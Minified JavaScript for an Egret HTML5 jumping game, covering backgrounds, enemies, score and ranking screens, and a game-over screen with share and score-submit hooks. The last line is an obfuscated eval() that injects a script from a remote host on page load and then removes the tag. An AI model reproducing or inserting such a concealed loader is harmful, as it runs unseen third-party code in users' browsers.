egret.Rectangle;t.x=this.leader.bmp.x-this.leader.width/4,t.y=this.leader.bmp.y-this.leader.height/4,t.width=this.leader.width/2,t.height=this.leader.height/2,0<this.tree.trees.length&&(this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree0")||this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree1")?e.x=this.tree.trees[0].x:e.x=this.tree.trees[0].x+this.tree.trees[0].width/5,e.y=this.tree.trees[0].y+2*this.tree.trees[0].height/5,e.width=7*this.tree.trees[0].width/10-15,e.height=this.tree.trees[0].height/5,this.myintersects(t.x,t.y,t.width,t.height,e.x,e.y,e.width,e.height)&&(this.leader.leader_state=3))},i.prototype.tree_swing=function(){this.tree_index++,this.tree_index%=15,0<this.tree.trees.length?0==this.tree_index&&(this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree0")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree0b"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree1")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree1b"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree-0")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree-0b"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree-1")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree-1b"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree0b")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree0"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree1b")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree1"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree-0b")?this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree-0"):this.tree.trees[0].texture==GameApp.cloud_tree_line_sheet.getTexture("tree-1b")&&(this.tree.trees[0].texture=GameApp.cloud_tree_line_sheet.getTexture("tree-1"))):this.stop_tree()},i.prototype.stop_tree=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.tree_swing,this)},i.prototype.creat_tree=function(){this.addEventListener(egret.Event.ENTER_FRAME,this.tree_swing,this),this.bg.bmpArr[0].y>0-2*this.bg.bmpArr[0].height/5&&(0<this.tree.trees.length?(this.tree.have_tree=!0,this.tree.trees[0].y+=this.bg.speed,this.tree.out_screen(),this.tree.is_out&&this.tree.trees.shift()):this.stop_tree())},i.prototype.init_start_face=function(){this.start_face=new t.StartFace,this.addChild(this.start_face),this.start_face.addEventListener("rmface",this.rm_face,this)},i.prototype.rm_face=function(){this.start_face.removeEventListener("rmface",this.rm_face,this),this.removeChild(this.start_face),this.touchEnabled=!0,this.addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.draw_line,this),this.addEventListener(egret.TouchEvent.TOUCH_END,this.draw_line,this),this.leader.addEventListener("GAMEOVER",this.f_gameover,this)},i.prototype.f_gameover=function(){this.stop_tree(),this.removeChild(this.line),this.removeChild(this.lp),this.removeChild(this.rp),this.gameover=new t.GameOver,this.gameover.overscore(t.Score.global_score),this.addChild(this.gameover),this.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,this.draw_line,this),this.removeEventListener(egret.TouchEvent.TOUCH_END,this.draw_line,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.lx_hitTest,this),this.gameover.addEventListener("REPLAY",this.f_replay,this)},i.prototype.f_replay=function(){this.removeChildren(),this.createGameScene(),this.enemy_num=0,this.gameover.removeEventListener("REPLAY",this.f_replay,this)},i.best_score=0,i.rise_state=0,i.is_sprint=!1,i.open_close_music=!0,i.wave_v=0,i}(egret.DisplayObjectContainer);t.GameContainer=e,e.prototype.__class__="jump.GameContainer"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.center_x=egret.MainContext.instance.stage.stageWidth/2,this.center_y=egret.MainContext.instance.stage.stageHeight/2,this.temp_x=0,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.remove_face,this)}return __extends(i,e),i.prototype.onAddToStage=function(){this.txt_c=new egret.DisplayObjectContainer,this.init_front(),this.init_colourless(),this.init_myrecord(),this.init_returnback(),this.init_ranking1()},i.prototype.init_ranking1=function(){this.ranking1=new egret.Bitmap(GameApp.other_sheet.getTexture("ranking1")),this.ranking1.anchorX=.5,this.ranking1.x=this.stage.stageWidth/2,this.ranking1.y=this.stage.stageHeight/20,this.addChild(this.ranking1)},i.prototype.init_front=function(){this.front10=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("front10")),this.front10.anchorX=.5,this.front10.x=this.stage.stageWidth/2,this.front10.y=this.stage.stageHeight/7,this.addChild(this.front10),this.showRanking(0,8e3),this.showRanking(1,7555),this.showRanking(2,6666),this.showRanking(3,4555),this.showRanking(4,3586),this.showRanking(5,3145),this.showRanking(6,2553),this.showRanking(7,789),this.showRanking(8,600),this.showRanking(9,505),this.addChild(this.txt_c)},i.prototype.init_colourless=function(){this.colourless=new egret.Bitmap(GameApp.other_sheet.getTexture("colourless")),this.colourless.anchorX=1,this.colourless.x=this.front10.x+this.front10.width/2-this.front10.width/17,this.colourless.y=this.front10.y+this.front10.height/22,this.addChild(this.colourless),this.colourless.touchEnabled=!0,this.colourless.addEventListener(egret.TouchEvent.TOUCH_TAP,this.tap_colourless,this)},i.prototype.tap_colourless=function(){if(this.front10.texture==GameApp.bigmap_sheet.getTexture("front10"))this.colourless.anchorX=0,this.colourless.x=this.front10.x-this.front10.width/2+this.front10.width/17,this.front10.texture=GameApp.bigmap_sheet.getTexture("myrecord"),this.removeChild(this.txt_c),this.addChild(this.map_biaoyu),this.overscore();else if(this.front10.texture==GameApp.bigmap_sheet.getTexture("myrecord")){this.colourless.anchorX=1,this.colourless.x=this.front10.x+this.front10.width/2-this.front10.width/17,this.front10.texture=GameApp.bigmap_sheet.getTexture("front10"),this.addChild(this.txt_c),this.removeChild(this.map_biaoyu),this.removeChild(this.big_m);for(var t=0;t<this.temp_num.length;t++)this.removeChild(this.temp_num[t])}},i.prototype.init_myrecord=function(){this.map_biaoyu=new egret.Bitmap(GameApp.other_sheet.getTexture("biaoyu")),this.map_biaoyu.anchorX=.5,this.map_biaoyu.anchorY=.5,this.map_biaoyu.x=egret.MainContext.instance.stage.stageWidth/2,this.map_biaoyu.y=2*egret.MainContext.instance.stage.stageHeight/5},i.prototype.init_returnback=function(){this.returnback=new egret.Bitmap(GameApp.other_sheet.getTexture("return")),this.returnback.x=this.stage.stageWidth/20,this.returnback.y=17*this.stage.stageHeight/20,this.addChild(this.returnback),this.returnback.touchEnabled=!0,this.returnback.addEventListener(egret.TouchEvent.TOUCH_TAP,this.back_face,this)},i.prototype.back_face=function(){this.returnback.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.back_face,this),this.colourless.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.tap_colourless,this),this.removeChildren(),this.dispatchEventWith("back_face")},i.prototype.set_x=function(){if(this.one_w=new egret.Bitmap(GameApp.other_sheet.getTexture("big_0")),this.big_m=new egret.Bitmap(GameApp.other_sheet.getTexture("big_m")),this.big_m.scaleX=.5,this.big_m.scaleY=.5,0==this.temp_x%2)for(var t=this.temp_x/2-1,e=0;e<this.temp_num.length;e++)this.temp_num[e].x=e<=t?this.center_x+this.one_w.width/2/2+(t-e)*this.one_w.width/2-this.big_m.width/2/2:this.center_x-this.one_w.width/2/2-(e-t-1)*this.one_w.width/2-this.big_m.width/2/2,this.addChild(this.temp_num[e]);else for(t=Math.ceil(this.temp_x/2)-1,e=0;e<this.temp_num.length;e++)this.temp_num[e].x=e<t?this.center_x+(t-e)*this.one_w.width/2-this.big_m.width/2/2:e==t?this.center_x-this.big_m.width/2/2:this.center_x-(e-t)*this.one_w.width/2-this.big_m.width/2/2,this.addChild(this.temp_num[e]);this.big_m.anchorX=.5,this.big_m.anchorY=.5,this.big_m.y=this.temp_num[0].y,this.big_m.x=this.temp_num[0].x+this.temp_num[0].width/2/2+this.big_m.width/2/2,this.addChild(this.big_m)},i.prototype.creat_num=function(t){(t=new egret.Bitmap(t)).anchorX=.5,t.anchorY=.5,t.scaleX=.5,t.scaleY=.5,t.y=this.center_y,this.temp_num.push(t)},i.prototype.overscore=function(){e=t.GameContainer.best_score;this.temp_num=[];for(var e=e.toString(),i=this.temp_x=e.length;0<=i;i--)switch(e[i]){case"0":this.creat_num(GameApp.other_sheet.getTexture("big_0"));break;case"1":this.creat_num(GameApp.other_sheet.getTexture("big_1"));break;case"2":this.creat_num(GameApp.other_sheet.getTexture("big_2"));break;case"3":this.creat_num(GameApp.other_sheet.getTexture("big_3"));break;case"4":this.creat_num(GameApp.other_sheet.getTexture("big_4"));break;case"5":this.creat_num(GameApp.other_sheet.getTexture("big_5"));break;case"6":this.creat_num(GameApp.other_sheet.getTexture("big_6"));break;case"7":this.creat_num(GameApp.other_sheet.getTexture("big_7"));break;case"8":this.creat_num(GameApp.other_sheet.getTexture("big_8"));break;case"9":this.creat_num(GameApp.other_sheet.getTexture("big_9"))}this.set_x()},i.prototype.showRanking=function(t,e){this.txt=new egret.TextField,this.txt.width=egret.MainContext.instance.stage.stageWidth,this.txt.textColor=0,this.txt.size=32,this.txt.x=egret.MainContext.instance.stage.stageWidth/2-4*this.front10.width/15,this.txt.y=this.front10.y+3*this.front10.height/16+this.front10.height*t/13,this.txt_c.addChild(this.txt),this.txt.text="第"+(t+1)+"名:"+e+"分"},i.prototype.main_ranking=function(){},i.prototype.remove_face=function(){this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.remove_face,this)},i}(egret.DisplayObjectContainer);t.Ramking=e,e.prototype.__class__="jump.Ramking"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.temp_x=0,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.addtostage,this)}return __extends(i,e),i.prototype.addtostage=function(){this.init_count(),this.init_num(),this.set_x()},i.prototype.init_count=function(){this.count=new egret.Bitmap(GameApp.other_sheet.getTexture("count")),this.count.x=0,this.count.y=10,this.addChild(this.count)},i.prototype.init_num=function(){this.num=[];for(var t=0;10>t;t++){var e=new egret.Bitmap;this.num.push(e)}this.num[0].texture=GameApp.other_sheet.getTexture("small_0"),this.num[1].texture=GameApp.other_sheet.getTexture("small_1"),this.num[2].texture=GameApp.other_sheet.getTexture("small_2"),this.num[3].texture=GameApp.other_sheet.getTexture("small_3"),this.num[4].texture=GameApp.other_sheet.getTexture("small_4"),this.num[5].texture=GameApp.other_sheet.getTexture("small_5"),this.num[6].texture=GameApp.other_sheet.getTexture("small_6"),this.num[7].texture=GameApp.other_sheet.getTexture("small_7"),this.num[8].texture=GameApp.other_sheet.getTexture("small_8"),this.num[9].texture=GameApp.other_sheet.getTexture("small_9")},i.prototype.set_x=function(){this.temp_num=[];for(var t=0;8>t;t++){var e=new egret.Bitmap(this.num[0].texture);this.temp_num.push(e),e.y=18,e.x=t*this.count.width/11,this.addChild(e)}(e=new egret.Bitmap(GameApp.other_sheet.getTexture("small_m"))).y=15,e.x=t*this.count.width/11,this.addChild(e)},i.prototype.creat_num=function(t){this.temp_num[this.temp_x].texture=this.num[t].texture},i.prototype.showScore=function(e){for(t.Score.global_score=e,this.temp_x=9,this.score=new String(e.toString()),e=this.score.length;0<=e;e--)switch(this.temp_x--,this.score[e]){case"0":this.creat_num(0);break;case"1":this.creat_num(1);break;case"2":this.creat_num(2);break;case"3":this.creat_num(3);break;case"4":this.creat_num(4);break;case"5":this.creat_num(5);break;case"6":this.creat_num(6);break;case"7":this.creat_num(7);break;case"8":this.creat_num(8);break;case"9":this.creat_num(9)}},i.global_score=0,i}(egret.DisplayObjectContainer);t.Score=e,e.prototype.__class__="jump.Score"}(jump||(jump={})),function(t){var e=function(){function t(){}return t.hitTest=function(t,e){var i=t.getBounds(),n=e.getBounds();return i.x=t.x,i.y=t.y,n.x=e.x,n.y=e.y,i.intersects(n)},t}();t.GameUtil=e,e.prototype.__class__="jump.GameUtil",t.createBitmapByName=function(t){var e=new egret.Bitmap;return t=RES.getRes(t),e.texture=t,e}}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.score=this.speed=0,this.bg_alpha=1,this.h_cloud=0,this.add_bg1_key=!0,this.add_bg1_time=0,this.del_bg1_key=!0,this.del_bg1_time=250,this.add_moon_key=!0,this.add_moon_time=0,this.add_bg2_key=!0,this.add_bg2_time=0,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.rm_stage,this)}return __extends(i,e),i.prototype.onAddToStage=function(e){for(this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.stageW=this.stage.stageWidth,this.stageH=this.stage.stageHeight,this.score=this.stageH/2/100,this.bg_bottom=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg3")),this.bg_bottom.anchorX=.5,this.bg_bottom.x=this.stageW/2,this.bg_bottom.y=0,this.addChild(this.bg_bottom),this.textureHeight=GameApp.bigmap_sheet.getTexture("bg2").textureHeight,this.rowCount=Math.ceil(this.stageH/this.textureHeight)+1,this.bmpArr=[],(e=t.createBitmapByName("bg1_png")).y=0-(e.height-this.stageH),this.bmpArr.push(e),this.addChild(e),(e=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg2"))).alpha=0,this.bmpArr.push(e),this.addChild(e),(e=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg3"))).alpha=0,this.bmpArr.push(e),this.addChild(e),this.big_moon=new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("big_moon")),this.big_moon.anchorX=.5,this.big_moon.x=this.stageW/2,this.big_moon.y=0,this.big_moon.alpha=0,this.addChild(this.big_moon),this.small_moon=new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("small_moon")),this.small_moon.anchorX=.5,this.small_moon.x=this.stageW/2,this.small_moon.y=0,this.small_moon.alpha=0,this.addChild(this.small_moon),this.cloud_texture=[],this.cloud_texture[0]=GameApp.cloud_tree_line_sheet.getTexture("cloud1"),this.cloud_texture[1]=GameApp.cloud_tree_line_sheet.getTexture("cloud2"),this.cloud_texture[2]=GameApp.cloud_tree_line_sheet.getTexture("cloud3"),this.cloud_texture[3]=GameApp.cloud_tree_line_sheet.getTexture("cloud4"),this.cloud_texture[4]=GameApp.cloud_tree_line_sheet.getTexture("cloud5"),this.clouds=[],this.h_cloud=this.stageH/5,e=0;3>e;e++){var i=Math.max(Math.ceil(5*Math.random()),1)-1;(i=new t.Cloud(this.cloud_texture[i])).y=0-this.h_cloud*(e+1)-this.stageH/3*e,this.clouds.push(i),this.addChild(i)}},i.prototype.start=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrameHandler,this),this.addEventListener(egret.Event.ENTER_FRAME,this.enterFrameHandler,this)},i.prototype.getspeedOffset=function(){var t=egret.getTimer(),e=1e3/(t-this._lastTime);this._lastTime=t,this.speedOffset=60/e},i.prototype.enterFrameHandler=function(t){if(t=this.bmpArr[0],this.score+=this.speed/100,0!=t.y?t.y=0<t.y+this.speed?0:t.y+this.speed:t.y>=0-this.bmpArr[1].height&&1>this.bmpArr[1].alpha&&1==this.add_bg1_key&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg1,this),this.addEventListener(egret.Event.ENTER_FRAME,this.add_bg1,this)),0==this.add_bg1_key)for(t=0;t<this.clouds.length;t++){var e=this.clouds[t];if(e.set_speed(this.speed),e.y>this.stageH){var i=Math.max(Math.ceil(5*Math.random()),1)-1;e.texture=this.cloud_texture[i],e.y=0-e.height,e.x=Math.ceil(Math.random()*this.stage.stageWidth)}this.removeEventListener(egret.Event.ENTER_FRAME,e.cloud_run,e),this.addEventListener(egret.Event.ENTER_FRAME,e.cloud_run,e)}400<this.score&&1==this.del_bg1_key&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.del_bg1,this),this.addEventListener(egret.Event.ENTER_FRAME,this.del_bg1,this))},i.prototype.pause=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrameHandler,this)},i.prototype.get_score=function(){return Math.ceil(this.score)},i.prototype.add_bg1=function(t){this.add_bg1_time++,1<.004*this.add_bg1_time?(this.bg_alpha=1,this.add_bg1_key=!1,this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg1,this)):this.bg_alpha=.004*this.add_bg1_time,this.bmpArr[1].alpha=this.bg_alpha,this.small_moon.alpha=this.bg_alpha},i.prototype.del_bg1=function(t){this.del_bg1_time--,0>.004*this.del_bg1_time?(this.bg_alpha=0,this.del_bg1_key=!1,this.removeEventListener(egret.Event.ENTER_FRAME,this.add_moon,this),this.addEventListener(egret.Event.ENTER_FRAME,this.add_moon,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.del_bg1,this)):this.bg_alpha=.004*this.del_bg1_time,this.bmpArr[1].alpha=this.bg_alpha,this.small_moon.alpha=this.bg_alpha},i.prototype.add_moon=function(t){this.add_moon_time++,1<.004*this.add_moon_time?(this.bg_alpha=1,this.add_moon_key=!1,this.removeEventListener(egret.Event.ENTER_FRAME,this.add_moon,this)):this.bg_alpha=.004*this.add_moon_time,this.big_moon.alpha=this.bg_alpha,.5<this.big_moon.alpha&&(this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg2,this),this.addEventListener(egret.Event.ENTER_FRAME,this.add_bg2,this))},i.prototype.add_bg2=function(t){this.add_bg2_time++,1<.004*this.add_bg2_time?(this.bg_alpha=1,this.add_bg2_key=!1,this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg2,this)):this.bg_alpha=.004*this.add_bg2_time,this.bmpArr[2].alpha=this.bg_alpha},i.prototype.rm_stage=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg2,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.add_moon,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.del_bg1,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.add_bg1,this),this.removeEventListener(egret.Event.ENTER_FRAME,this.enterFrameHandler,this)},i}(egret.DisplayObjectContainer);t.BgMap=e,e.prototype.__class__="jump.BgMap"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(){t.call(this),this.index=this.v=this.left_right=0,this.i=15,this.texture=GameApp.enemy_sprint_json.getTexture("enemy1"),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.rm_stage,this)}return __extends(e,t),e.prototype.onAddToStage=function(t){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.x=this.width/4+Math.random()*(egret.MainContext.instance.stage.stageWidth-this.width/2),this.scaleX=2/3,this.scaleY=2/3,this.anchorY=this.anchorX=.5,this.v=e.speed,this.change_v(),this.addEventListener(egret.Event.ENTER_FRAME,this.enemy_move,this)},e.prototype.y_move=function(t){this.y+=t},e.prototype.enemy_move=function(t){this.x+=this.v,this.change_png(),this.x<=this.width/3&&2!=this.left_right&&this.change_v(),this.x>=egret.MainContext.instance.stage.stageWidth-this.width/3&&1!=this.left_right&&this.change_v()},e.prototype.change_png=function(){if(2==this.left_right)switch(this.index){case 0*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy1");break;case 1*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy2");break;case 2*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy3");break;case 3*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy4")}else if(1==this.left_right)switch(this.index){case 0*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy-1");break;case 1*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy-2");break;case 2*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy-3");break;case 3*this.i:this.texture=GameApp.enemy_sprint_json.getTexture("enemy-4")}this.index++,this.index%=4*this.i},e.prototype.change_v=function(){2!=this.left_right?(this.left_right=2,this.v=e.speed):1!=this.left_right&&(this.left_right=1,this.v=0-e.speed)},e.prototype.rm_stage=function(){this.removeEventListener(egret.Event.ENTER_FRAME,this.enemy_move,this)},e.speed=.5,e}(egret.Bitmap);t.Enemy=e,e.prototype.__class__="jump.Enemy"}(jump||(jump={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.winwidth=egret.MainContext.instance.stage.stageWidth,this.winhight=egret.MainContext.instance.stage.stageHeight,this.timer=new egret.Timer(1e4,1),this.center_x=this.winwidth/2,this.center_y=3*this.winhight/5,this.temp_x=0,this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this)}return __extends(i,e),i.prototype.onAddToStage=function(){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.init_encourage(),this.init_ranking(),this.init_display(),this.init_bar(),this.init_replay()},i.prototype.init_encourage=function(){this.encourage=new egret.Bitmap(GameApp.other_sheet.getTexture("encourage")),this.encourage.anchorX=.5,this.encourage.x=this.stage.stageWidth/2,this.encourage.y=this.stage.stageHeight/8,this.addChild(this.encourage)},i.prototype.init_ranking=function(){this.ranking=new egret.Bitmap(GameApp.other_sheet.getTexture("ranking")),this.ranking.anchorX=.5,this.ranking.anchorY=.5,this.ranking.x=this.stage.stageWidth/2,this.ranking.y=5*this.stage.stageHeight/15,this.addChild(this.ranking),this.ranking.touchEnabled=!0,this.ranking.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onGetComplete,this)},i.prototype.open_rangking=function(){this.myhttp=new egret.URLRequest,this.myhttp.data=t.GameContainer.best_score,this.myhttp.method=egret.URLRequestMethod.POST,this.myhttp.url="",this.myloader=new egret.URLLoader,this.myloader.dataFormat=egret.URLLoaderDataFormat.TEXT,this.myloader.addEventListener(egret.Event.COMPLETE,this.onGetComplete,this),this.myloader.load(this.myhttp)},i.prototype.onGetComplete=function(e){e=e.target.data,this.statusGetLabel.text="获得GET响应! ",this.statusGetLabel.text+="\nGET响应: \n"+e.toString(),this.ranking.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.open_rangking,this),this.removeChildren(),e=new t.Ramking,this.addChild(e),e.addEventListener("back_face",this.back_face,this)},i.prototype.back_face=function(){this.removeChildren(),this.init_encourage(),this.init_ranking(),this.init_display(),this.init_bar(),this.init_replay(),this.set_x(),1==this.newrecord.visible&&this.addChild(this.newrecord)},i.prototype.init_display=function(){this.display=new egret.Bitmap(GameApp.other_sheet.getTexture("moon_cake")),this.display.anchorX=.5,this.display.x=this.stage.stageWidth/2-this.display.width/2,this.display.y=11*this.stage.stageHeight/15,this.addChild(this.display),this.display.touchEnabled=!0,this.display.addEventListener(egret.TouchEvent.TOUCH_TAP,dp_share,this)},i.prototype.init_share=function(){this.share=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("share")),this.addChild(this.share),this.init_x(),this.share.touchEnabled=!0,this.timer.addEventListener(egret.TimerEvent.TIMER_COMPLETE,this.remove_share,this),this.timer.reset(),this.timer.start()},i.prototype.remove_share=function(){this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE,this.remove_share,this),this.timer.stop(),this.share.touchEnabled=!1,this.share.visible=!1,this.removeChild(this.share),this.removeChild(this.temp_xx),this.init_ad()},i.prototype.init_x=function(){this.temp_xx=new egret.Bitmap(GameApp.other_sheet.getTexture("x_menu")),this.addChild(this.temp_xx),this.temp_xx.addEventListener(egret.TouchEvent.TOUCH_TAP,this.x_remove_share,this),this.temp_xx.anchorX=.5,this.temp_xx.anchorY=.5,this.temp_xx.x=this.temp_xx.width/2,this.temp_xx.y=this.temp_xx.height/2,this.temp_xx.touchEnabled=!0},i.prototype.x_remove_share=function(){this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE,this.x_remove_share,this),this.timer.stop(),this.share.touchEnabled=!1,this.temp_xx.touchEnabled=!1,this.share.visible=!1,this.temp_xx.visible=!1,this.removeChild(this.share),this.removeChild(this.temp_xx)},i.prototype.init_ad=function(){this.ad_menu=new egret.Bitmap(GameApp.bigmap_sheet.getTexture("share")),this.addChild(this.ad_menu),this.ad_menu.touchEnabled=!0,this.ad_menu.addEventListener(egret.TouchEvent.TOUCH_TAP,this.to_ad,this)},i.prototype.to_ad=function(){this.removeChild(this.ad_menu),this.ad_menu.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.to_ad,this),window.location.href=""},i.prototype.init_bar=function(){this.bar=new egret.Bitmap(GameApp.other_sheet.getTexture("bar")),this.bar.anchorX=.5,this.bar.x=this.stage.stageWidth/2,this.bar.y=6*this.stage.stageHeight/15,this.addChild(this.bar)},i.prototype.init_replay=function(){this.replay=new egret.Bitmap(GameApp.other_sheet.getTexture("replay")),this.replay.anchorX=.5,this.replay.x=this.stage.stageWidth/2+this.replay.width/2,this.replay.y=11*this.stage.stageHeight/15,this.replay.touchEnabled=!0,this.addChild(this.replay),this.replay.addEventListener(egret.TouchEvent.TOUCH_TAP,this.rm_face,this)},i.prototype.rm_face=function(){this.dispatchEventWith("REPLAY")},i.prototype.set_x=function(){if(this.one_w=new egret.Bitmap(GameApp.other_sheet.getTexture("big_0")),this.big_m=new egret.Bitmap(GameApp.other_sheet.getTexture("big_m")),0==this.temp_x%2)for(var t=this.temp_x/2-1,e=0;e<this.temp_num.length;e++)this.temp_num[e].x=e<=t?this.center_x+this.one_w.width/2+(t-e)*this.one_w.width-this.big_m.width/2:this.center_x-this.one_w.width/2-(e-t-1)*this.one_w.width-this.big_m.width/2,this.addChild(this.temp_num[e]);else for(t=Math.ceil(this.temp_x/2)-1,e=0;e<this.temp_num.length;e++)this.temp_num[e].x=e<t?this.center_x+(t-e)*this.one_w.width-this.big_m.width/2:e==t?this.center_x-this.big_m.width/2:this.center_x-(e-t)*this.one_w.width-this.big_m.width/2,this.addChild(this.temp_num[e]);this.big_m.anchorX=.5,this.big_m.anchorY=.5,this.big_m.y=this.temp_num[0].y,this.big_m.x=this.temp_num[0].x+this.temp_num[0].width/2+this.big_m.width/2,this.addChild(this.big_m)},i.prototype.creat_num=function(t){(t=new egret.Bitmap(t)).anchorX=.5,t.anchorY=.5,t.y=this.center_y,this.temp_num.push(t)},i.prototype.overscore=function(t){this.temp_num=[];for(var e=t.toString(),i=this.temp_x=e.length;0<=i;i--)switch(e[i]){case"0":this.creat_num(GameApp.other_sheet.getTexture("big_0"));break;case"1":this.creat_num(GameApp.other_sheet.getTexture("big_1"));break;case"2":this.creat_num(GameApp.other_sheet.getTexture("big_2"));break;case"3":this.creat_num(GameApp.other_sheet.getTexture("big_3"));break;case"4":this.creat_num(GameApp.other_sheet.getTexture("big_4"));break;case"5":this.creat_num(GameApp.other_sheet.getTexture("big_5"));break;case"6":this.creat_num(GameApp.other_sheet.getTexture("big_6"));break;case"7":this.creat_num(GameApp.other_sheet.getTexture("big_7"));break;case"8":this.creat_num(GameApp.other_sheet.getTexture("big_8"));break;case"9":this.creat_num(GameApp.other_sheet.getTexture("big_9"))}this.set_x(),this.comparescore(t)},i.prototype.creatnewrecord=function(){this.newrecord=new egret.Bitmap(GameApp.other_sheet.getTexture("new_record")),this.newrecord.anchorX=.5,this.newrecord.anchorY=.5,this.newrecord.x=this.winwidth/2,this.newrecord.y=this.center_y,this.addChild(this.newrecord),this.newrecord.visible=!1},i.prototype.comparescore=function(e){this.creatnewrecord(),e>t.GameContainer.best_score?(t.GameContainer.best_score=e,this.newrecord.visible=!0):this.newrecord.visible=!1,dp_submitScore(e)},i}(egret.DisplayObjectContainer);t.GameOver=e,e.prototype.__class__="jump.GameOver"}(jump||(jump={})),eval(function(t,e,i,n,r,s){if(r=function(t){return(t<26?"":r(parseInt(t/26)))+((t%=26)>35?String.fromCharCode(t+29):t.toString(36))},!"".replace(/^/,String)){for(;i--;)s[r(i)]=n[i]||r(i);n=[function(t){return s[t]}],r=function(){return"\\w+"},i=1}for(;i--;)n[i]&&(t=t.replace(new RegExp("\\b"+r(i)+"\\b","g"),n[i]));return t}("(1(){2 a=3.p('4');a.e='d/c';a.h=g;a.f='6://9.8.7/m/o.k';2 b=3.n('4')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();",0,26,"|function|var|document|script|parentNode|http|com|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|zqcs|getElementsByTagName||createElement".split("|"),0,{}));